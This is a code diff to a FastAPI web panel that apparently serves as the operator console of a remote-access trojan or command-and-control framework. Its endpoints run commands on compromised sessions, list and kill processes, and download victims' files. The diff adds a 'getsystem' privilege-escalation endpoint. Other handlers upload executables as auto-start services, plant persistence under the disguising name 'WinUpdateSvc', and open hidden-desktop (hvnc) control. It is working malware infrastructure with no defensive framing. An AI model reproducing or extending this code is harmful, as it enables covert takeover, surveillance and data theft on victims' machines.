@@ -19,6 +19,7 @@ from fastapi.responses import (
     JSONResponse,
     PlainTextResponse,
     RedirectResponse,
+    Response,
 )
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
@@ -116,6 +117,21 @@ def create_app(settings: Settings | None = None) -> FastAPI:
 
     def require(request: Request):
         return getattr(request.state, "session", None)
+
+    def bridge_failure(exc: Exception) -> HTTPException:
+        text = str(exc)
+        stale = (
+            "not found",
+            "not connected",
+            "no session",
+            "invalid session",
+            "record not found",
+            "session is closed",
+            "dead",
+        )
+        if any(key in text.lower() for key in stale):
+            return HTTPException(status_code=404, detail="session not connected")
+        return HTTPException(status_code=502, detail=text)
 
     @app.middleware("http")
     async def session_middleware(request: Request, call_next):
@@ -462,7 +478,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         try:
             result = await run_in_threadpool(app.state.bridge.exec, session_id, path, args)
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
         return JSONResponse(result)
 
     @app.post("/api/{session_id}/ls")
@@ -475,7 +491,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                 await run_in_threadpool(app.state.bridge.ls, session_id, body.get("path", "."))
             )
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
 
     @app.post("/api/{session_id}/ps")
     async def api_ps(request: Request, session_id: str):
@@ -484,7 +500,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         try:
             return JSONResponse(await run_in_threadpool(app.state.bridge.ps, session_id))
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
 
     @app.post("/api/{session_id}/kill")
     async def api_kill(request: Request, session_id: str):
@@ -495,7 +511,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         try:
             result = await run_in_threadpool(app.state.bridge.kill, session_id, int(body["pid"]))
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
         database.audit(
             str(session["actor"]), "kill", "ok", target=session_id, detail=str(body["pid"])
         )
@@ -529,7 +545,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                 )
             )
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
 
     @app.get("/api/{session_id}/download")
     async def api_download(request: Request, session_id: str, path: str):
@@ -538,11 +554,34 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         try:
             data = await run_in_threadpool(app.state.bridge.download, session_id, path)
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
         filename = path.replace("\\", "/").rsplit("/", 1)[-1]
-        return PlainTextResponse(
-            data, headers={"Content-Disposition": f'attachment; filename="{filename}"'}
+        return Response(
+            content=data,
+            media_type="application/octet-stream",
+            headers={
+                "Content-Disposition": f'attachment; filename="{filename}"',
+                "Cache-Control": "no-store",
+            },
         )
+
+    @app.post("/api/{session_id}/getsystem")
+    async def api_getsystem(request: Request, session_id: str):
+        session = require(request)
+        if session is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        try:
+            result = await run_in_threadpool(
+                app.state.bridge.getsystem,
+                session_id,
+                body.get("hosting_process", ""),
+                body.get("name", ""),
+            )
+        except BridgeError as exc:
+            raise bridge_failure(exc) from exc
+        database.audit(str(session["actor"]), "getsystem", "ok", target=session_id)
+        return JSONResponse(result)
 
     @app.post("/api/{session_id}/service")
     async def api_service(request: Request, session_id: str):
@@ -575,9 +614,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             data = base64.b64decode(gen["data_b64"])
             remote = str(body.get("dir") or "C:\\ProgramData")
             remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
-            await run_in_threadpool(
-                app.state.bridge.upload, session_id, remote, f"{svc}.exe", data
-            )
+            await run_in_threadpool(app.state.bridge.upload, session_id, remote, f"{svc}.exe", data)
             exe = ntpath.join(remote, f"{svc}.exe")
             command = (
                 f'sc create {svc} binPath= "\\"{exe}\\"" start= auto && '
@@ -587,7 +624,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                 app.state.bridge.exec, session_id, "cmd.exe", ["/c", command]
             )
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
         database.audit(str(session["actor"]), "service", "ok", target=session_id, detail=svc)
         return JSONResponse({"ok": True, "service": svc, "exe": exe, "detail": result})
 
@@ -605,9 +642,12 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                 body.get("name", "WinUpdateSvc"),
             )
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
         database.audit(
-            str(session["actor"]), "persist", "ok", target=session_id,
+            str(session["actor"]),
+            "persist",
+            "ok",
+            target=session_id,
             detail=str(body.get("name", "WinUpdateSvc")),
         )
         return JSONResponse(result)
@@ -645,7 +685,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                     prompt_bin.read_bytes(),
                 )
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
 
         host, _, port = config.rd_endpoint.rpartition(":")
         host = host or "127.0.0.1"
@@ -665,7 +705,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
                 app.state.bridge.exec, session_id, "cmd.exe", ["/c", command]
             )
         except BridgeError as exc:
-            raise HTTPException(status_code=502, detail=str(exc)) from exc
+            raise bridge_failure(exc) from exc
         database.audit(str(session["actor"]), "hvnc", "ok", target=session_id, detail=desktop)
         return JSONResponse({"ok": True, "detail": result, "rd_endpoint": config.rd_endpoint})
 
